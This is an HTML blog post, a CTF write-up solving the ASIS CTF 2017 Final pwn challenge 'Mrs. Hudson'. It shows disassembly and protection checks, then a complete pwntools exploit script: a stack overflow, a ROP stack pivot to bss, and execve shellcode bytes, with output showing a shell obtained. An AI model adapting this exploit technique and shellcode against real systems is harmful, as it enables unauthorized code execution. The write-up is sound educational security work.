<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>ASIS-CTF-2017-FINAL-Mrs.Hudson &#8211; z3r0s</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="keywords" content="">
    <link rel="canonical" href="http://z3r0s.github.io/2017/09/13/asis-ctf-2017-final-mrs-hudson/">
    <link rel="alternate" type="application/rss+xml" title="RSS Feed for z3r0s" href="/feed.xml" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/pixyll.css?201712262047" type="text/css">

    <!-- Fonts -->
    <link href='//fonts.googleapis.com/css?family=Merriweather:900,900italic,300,300italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Lato:900,300' rel='stylesheet' type='text/css'>
    

    <!-- Verifications -->
    

    <!-- Open Graph -->
    <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="article">
    <meta property="og:title" content="ASIS-CTF-2017-FINAL-Mrs.Hudson">
    <meta property="og:description" content="">
    <meta property="og:url" content="http://z3r0s.github.io/2017/09/13/asis-ctf-2017-final-mrs-hudson/">
    <meta property="og:site_name" content="z3r0s">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    
        <meta name="twitter:site" content="@_z3r0s_" />
    
    <meta name="twitter:title" content="ASIS-CTF-2017-FINAL-Mrs.Hudson" />
    <meta name="twitter:description" content="" />
    <meta name="twitter:url" content="http://z3r0s.github.io/2017/09/13/asis-ctf-2017-final-mrs-hudson/" />

    <!-- Icons -->
    <!--
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="/favicon-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
    -->

    
</head>

<body class="site">

	

  <div class="site-wrap">
    <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="http://z3r0s.github.io" class="site-title">z3r0s</a>
      <nav class="site-nav">
        
    

    
        <a href="/about/">About</a>
    

    

    

    

    


    

    

    
        <a href="/contact/">Contact</a>
    

    

    

    


      </nav>
      <div class="clearfix"></div>
      
    </div>
  </div>
</header>


    <div class="post p2 p-responsive wrap" role="main">
      <div class="measure">
        


<div class="post-header mb2">
  <h1>ASIS-CTF-2017-FINAL-Mrs.Hudson</h1>
  <span class="post-meta">Sep 13, 2017</span><br>
  
  <span class="post-meta"><b> - zero</b></span><br/>
  <span class="post-meta small">
  
    3 minute read
  
  </span>
</div>

<article class="post-content">
  <p><strong>Description</strong>:
England would fall if Mrs. Hudson leaves Baker Street. Mrs. Hudson is the first one who is totally exploited by Sherlock, or Does She?</p>

<h2 id="file">File</h2>

<p><code>
~/Desktop                                                         
▶ file hudson
hudson: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a99b54f5a0f90ebade826e34188ac1f5eebb2cc7, not stripped
</code></p>

<p>The given binary was not stripped, which often implies either the challenge is extremely difficult or simple.</p>

<h2 id="protections">Protections</h2>

<p><code>
~/Desktop 
▶ checksec --file hudson
[*] '/home/zero/Desktop/hudson'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></p>

<p>No protections were enabled, which made it eaiser for me to solve.</p>

<h2 id="program">Program</h2>

<div class="highlight"><pre><code class="language-c" data-lang="c">000000000040061a &lt;main&gt;:
  40061a:       55                      push   %rbp
  40061b:       48 89 e5                mov    %rsp,%rbp
  40061e:       48 83 c4 80             add    $0xffffffffffffff80,%rsp
  400622:       89 7d 8c                mov    %edi,-0x74(%rbp)
  400625:       48 89 75 80             mov    %rsi,-0x80(%rbp)
  400629:       48 8b 05 20 0a 20 00    mov    0x200a20(%rip),%rax        # 601050 &lt;stdin@@GLIBC_2.2.5&gt;
  400630:       b9 00 00 00 00          mov    $0x0,%ecx
  400635:       ba 02 00 00 00          mov    $0x2,%edx
  40063a:       be 00 00 00 00          mov    $0x0,%esi
  40063f:       48 89 c7                mov    %rax,%rdi
  400642:       e8 c9 fe ff ff          callq  400510 &lt;setvbuf@plt&gt;
  400647:       48 8b 05 f2 09 20 00    mov    0x2009f2(%rip),%rax        # 601040 &lt;__TMC_END__&gt;
  40064e:       b9 00 00 00 00          mov    $0x0,%ecx
  400653:       ba 02 00 00 00          mov    $0x2,%edx
  400658:       be 00 00 00 00          mov    $0x0,%esi
  40065d:       48 89 c7                mov    %rax,%rdi
  400660:       e8 ab fe ff ff          callq  400510 &lt;setvbuf@plt&gt;
  400665:       bf 14 07 40 00          mov    $0x400714,%edi
  40066a:       e8 91 fe ff ff          callq  400500 &lt;puts@plt&gt;
  40066f:       48 8d 45 90             lea    -0x70(%rbp),%rax
  400673:       48 89 c6                mov    %rax,%rsi
  400676:       bf 2b 07 40 00          mov    $0x40072b,%edi
  40067b:       b8 00 00 00 00          mov    $0x0,%eax
  400680:       e8 9b fe ff ff          callq  400520 &lt;__isoc99_scanf@plt&gt;
  400685:       c9                      leaveq 
  400686:       c3                      retq</code></pre></div>

<p>The program was very small enough that I used objdump instead of IDA to see what the program does. It simply prints a text and waits for the user input using scanf.</p>

<h2 id="analysis">Analysis</h2>

<p><code>
~/Desktop                                                         
▶ ./hudson
Let's go back to 2000.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    87899 segmentation fault (core dumped)  ./hudson
</code></p>

<p>As a first step, I ran the program.  I gave in a large number of ‘a’ to see if it would crash the program and it did.</p>

<p>It turned out to be a simple stack overflow. Since there were no protections, I was immediately thinking of redirecting rip to the address of buffer that has my shellcode. But, the issue with this method was that I have no way of knowing the address of buffer without some form of leak.</p>

<p>Thus, I either had to use rop or store the shellcode in static address that would not get affected by aslr. I went with the second method since the organizer did not provide libc for this problem.</p>

<h2 id="exploit">Exploit</h2>

<p>As the output of the program suggested, I pivoted a stack to bss and read in the shellcode near bss. This was done so that it executes my shellcode when the program returns from the fake stack.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python">from pwn import *
import sys

context.log_level=True

local = 1

libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)

if local:
        r = remote(&quot;localhost&quot;,5555)
        pause()
else:
        r = remote(&quot;178.62.249.106&quot;,8642)
        pause()


puts = p64(0x000000000040066a)
prdi = p64(0x004006f3)
main = p64(0x000000000040066f)
prsi = p64(0x004006f1)
prbp = p64(0x00400575)
leave = p64(0x0000000000400685)

payload = &quot;A&quot;*120
payload += prsi #pop rsi ; pop r15 ; ret  ;  (1 found)
payload += p64(0x601081) #bss
payload += p64(0x41) #junk
payload += prbp #pop rbp ; ret  ;  (1 found)   
payload += p64(0x000000000601079) #stack pivot
payload += p64(0x0000000000400676) #scanf
payload += p64(0x0000000000601050) #near bss (calculated)

s =&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;

r.recvuntil(&quot;.&quot;)
r.sendline(payload)

r.sendline(p64(0x000000000601089)+s) #read in shellcode 

r.interactive()</code></pre></div>

<p>The result of running the exploit</p>

<p><code>
~/Desktop                                                                                                                           
▶ python hudson.py
[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to localhost on port 5555: Done
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1000(zero) gid=1000(zero) groups=1000(zero),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ exit
[*] Got EOF while reading in interactive
</code></p>

</article>











      </div>
    </div>
  </div>

  <footer class="center">
  <div class="measure">
    <small>Being a hacker is 1% perspiration and 99% alcoholism </small>
    <br/>
    <small>
    </small>
  </div>
</footer>

</body>
</html>
